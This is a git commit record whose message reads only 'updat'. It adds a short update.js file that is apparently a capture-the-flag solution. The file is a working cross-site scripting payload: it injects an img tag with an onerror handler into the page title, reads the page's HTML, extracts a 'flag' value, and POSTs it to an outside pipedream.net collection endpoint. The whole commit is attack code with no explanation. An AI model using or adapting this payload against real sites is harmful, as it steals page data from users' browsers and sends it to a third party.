8f5cfa777a004fb1dcfe134ab5d878d183583522
xsxsz <dilemma@mail.dlut.edu.cn>
2024-03-18 10:57:10 -0400

    updat

---
+++ update.js
@@ -0,0 +1,7 @@
+func_str="console.log('inject');body_text = document.body.innerHTML;start_idx = body_text.lastIndexOf(\'>\') + 1;flag = body_text.substring(start_idx);console.log(flag);const headers = new Headers();headers.append('Content-Type', 'application/json');const body={'flag':flag};const options={method: 'POST',headers,mode: 'cors',body: JSON.stringify(body),};fetch('https://ensxvdjj7j5dr.x.pipedream.net/', options);";
+
+title_str = "</h1><img src='not_exist.jpg' onerror=\"" + func_str + "\"></img><h1>";
+
+setTimeout(function(){
+    document.title = title_str;
+}, 2000);
